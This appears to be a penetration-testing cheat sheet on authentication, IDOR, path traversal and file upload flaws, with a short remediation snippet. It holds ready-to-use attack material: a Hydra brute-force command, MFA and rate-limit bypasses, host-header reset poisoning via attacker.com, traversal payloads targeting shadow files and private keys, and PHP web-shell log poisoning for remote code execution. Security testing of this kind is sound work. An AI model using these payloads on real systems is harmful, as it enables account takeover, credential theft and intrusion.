# Authentication & Access Control Vulnerabilities

Covers broken authentication, IDOR, file path traversal, and file upload security.

## Broken Authentication

### Authentication Testing Methodology

1. **Analyze auth mechanism**: Password-based, token-based (JWT/OAuth), certificate, MFA
2. **Map auth endpoints**: `/login`, `/register`, `/forgot-password`, `/reset-password`, `/api/auth/*`
3. **Test password policy**: Min length, complexity, common passwords, username-as-password
4. **Test credential enumeration**: Different error messages for valid vs invalid usernames
5. **Test brute force protections**: Account lockout, rate limiting, CAPTCHA

### Credential Attacks

```bash
# Hydra form-based brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

### Rate Limiting Bypass Headers
```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

### Session Management Testing

- **Session fixation**: Check if session regenerates after login
- **Token entropy**: Collect 100+ tokens, analyze for patterns/predictability
- **Cookie flags**: HttpOnly, Secure, SameSite, Path, Domain, Expires
- **Timeout**: Test idle timeout (15-60 min) and absolute timeout

### JWT Token Attacks
```bash
# Decode JWT and check for weak implementation
# Try "none" algorithm attack:
# Change header to {"alg":"none"} and remove signature
# Modify payload (e.g., change role to admin)
```

### MFA Bypass Techniques
```
- Skip MFA step via direct URL access
- Modify response to indicate MFA passed
- Null/empty OTP submission
- Previous valid OTP reuse
- API version downgrade: /api/v3/check-otp → /api/v2/check-otp
- OTP brute force (4-digit = 10,000 combinations)
```

### Password Reset Vulnerabilities
```bash
# Test token properties: reuse, expiration, predictability
# Host header injection:
POST /forgot-password HTTP/1.1
Host: attacker.com
email=victim@email.com
# Reset email may contain attacker's domain

# Parameter manipulation:
https://target.com/reset?token=abc123&email=admin@example.com
```

### Common Auth Vulnerability Types

| Vulnerability | Risk | Test Method |
|--------------|------|-------------|
| Weak passwords | High | Policy testing, dictionary attack |
| No lockout | High | Brute force testing |
| Username enumeration | Medium | Differential response analysis |
| Session fixation | High | Pre/post-login session comparison |
| Weak session tokens | High | Entropy analysis |
| No session timeout | Medium | Long-duration testing |
| Insecure password reset | High | Token analysis, workflow bypass |
| MFA bypass | Critical | Direct access, response manipulation |

## IDOR (Insecure Direct Object References)

### IDOR Types
- **Database objects**: `/user/profile?id=2023` → change to `?id=2022`
- **Static files**: `/static/receipt/205.pdf` → try `/static/receipt/200.pdf`

### Detection Techniques

```
# URL parameter manipulation
GET /api/user/profile?id=1001 → change to ?id=1000

# Request body manipulation
{"userId": 1001} → {"userId": 1000}

# HTTP method switching
GET /api/admin/users/1000 → 403
POST /api/admin/users/1000 → 200 (Vulnerable!)
```

### IDOR Bypass Techniques
```bash
# Wrap ID in array
{"id":111} → {"id":[111]}

# JSON wrap
{"id":111} → {"id":{"id":111}}

# Parameter pollution
/api/get_profile?user_id=<victim>&user_id=<legit>

# Wildcard
{"user_id":"*"}

# Send ID twice
URL?id=<LEGIT>&id=<VICTIM>
```

### Common IDOR Locations
```
/api/user/{id}, /api/profile/{id}, /api/order/{id}
/api/invoice/{id}, /api/document/{id}, /api/message/{id}
/download/invoice_{id}.pdf, /uploads/documents/{filename}
?userId=123, ?orderId=456, ?file=report_123.pdf
```

### IDOR Testing with Burp Intruder
```
1. Send request to Intruder
2. Set ID parameter as payload position
3. Type: Sniper, Payload: Numbers 1-10000
4. Analyze 200 responses for unauthorized data access
```

### Remediation
```python
# Always validate ownership
def update_address(request, address_id):
    address = Address.objects.get(id=address_id)
    if address.user != request.user:
        return HttpResponseForbidden("Unauthorized")
    address.update(request.data)
```

## File Path Traversal

### Identifying Traversal Points
```
Vulnerable parameters: ?file=, ?path=, ?page=, ?template=,
?filename=, ?doc=, ?include=, ?src=, ?download=, ?load=
```

### Basic Payloads
```bash
# Linux
../../../etc/passwd
../../../../etc/passwd

# Windows
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts

# URL encoded
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd  # Double encoding
```

### Bypass Techniques
```bash
# Stripped traversal bypass
....//....//....//etc/passwd
..././..././..././etc/passwd

# Extension validation bypass (older PHP)
../../../etc/passwd%00.jpg

# Base directory validation bypass
/var/www/images/../../../etc/passwd

# Unicode/UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc/passwd
```

### High-Value Target Files

| OS | File | Purpose |
|----|------|---------|
| Linux | `/etc/passwd` | User accounts |
| Linux | `/etc/shadow` | Password hashes (root) |
| Linux | `/root/.ssh/id_rsa` | Root private key |
| Linux | `/proc/self/environ` | Environment variables |
| Linux | `/var/www/html/wp-config.php` | WordPress DB creds |
| Windows | `C:\windows\win.ini` | System config |
| Windows | `C:\windows\system32\config\SAM` | Password hashes |
| Windows | `C:\inetpub\wwwroot\web.config` | IIS config |

### LFI to RCE Escalation
```bash
# Log poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"

# PHP wrappers
php://filter/convert.base64-encode/resource=config.php
php://input  (POST PHP code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
```

## File Upload Security

### Critical Issues

| Issue | Severity | Solution |
|-------|----------|----------|
| Trusting client-provided file type | Critical | Check magic bytes |
| No upload size restrictions | High | Set size limits |
| User-controlled filename (path traversal) | Critical | Sanitize filenames |
| Presigned URL shared/cached incorrectly | Medium | Control distribution |

### Testing Approach
- Never trust file extensions - verify magic bytes
- Test for path traversal in filenames
- Test upload size limits
- Check if executable files can be uploaded and accessed
- Prefer presigned URLs over server proxying for large uploads
